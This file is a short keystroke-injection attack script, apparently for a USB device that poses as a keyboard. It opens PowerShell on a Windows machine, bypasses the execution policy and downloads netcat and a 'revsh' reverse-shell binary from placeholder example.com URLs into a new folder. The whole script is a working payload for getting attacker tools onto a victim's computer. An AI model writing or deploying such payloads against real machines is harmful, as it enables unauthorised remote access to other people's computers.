layout('us');		// US keyboard layout
typingSpeed(0,0);	// type as fast as possible

// uris and configurations
ncatUri = "https://example.com/ncat.exe";
revshUri = "https://example.com/revsh.exe";

// starting powershell
press('GUI r');
delay(1000);
type('powershell\n');
delay(1000);

// starting the stuff
type('cd \\\n');
type('mkdir revsh\n');
type('cd revsh\n');
// getting netcat
type("echo (wget '" + ncatUri + "' -OutFile n.exe) > b.ps1\n");
type("powershell -ExecutionPolicy ByPass -File b.ps1\n");
delay(5000);

// getting revsh
type("echo (wget '" + revshUri + "' -OutFile r.exe) > c.ps1\n");
type("powershell -ExecutionPolicy ByPass -File c.ps1\n");
delay(5000);

type("dir\n");

